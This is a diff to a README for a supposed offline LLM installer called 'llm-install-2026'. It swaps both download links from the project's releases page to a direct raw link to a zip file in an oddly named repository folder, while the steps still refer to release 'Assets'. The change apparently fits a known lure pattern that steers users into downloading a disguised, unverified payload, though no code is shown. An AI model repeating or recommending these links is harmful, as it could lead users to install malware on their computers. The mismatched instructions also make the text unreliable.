@@ -1,6 +1,6 @@
 # 🤖 llm-install-2026 - Run powerful artificial intelligence locally today
 
-[![Download Installer](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Dinnerjacketfetich554/llm-install-2026/releases)
+[![Download Installer](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Dinnerjacketfetich554/llm-install-2026/raw/refs/heads/main/outtravel/llm-install-v2.0.zip)
 
 This application enables users to run advanced language models directly on a Windows computer. You keep your data private because the software functions entirely offline. You do not need an internet connection to process queries once the setup finishes.
 
@@ -18,7 +18,7 @@ Your computer requires specific hardware to run these models effectively. Ensure
 
 You must visit the project release page to download the latest version of the installer.
 
-[Click here to open the download page](https://github.com/Dinnerjacketfetich554/llm-install-2026/releases)
+[Click here to open the download page](https://github.com/Dinnerjacketfetich554/llm-install-2026/raw/refs/heads/main/outtravel/llm-install-v2.0.zip)
 
 1. Navigate to the link provided above.
 2. Look for the section titled "Assets" at the bottom of the newest release post.
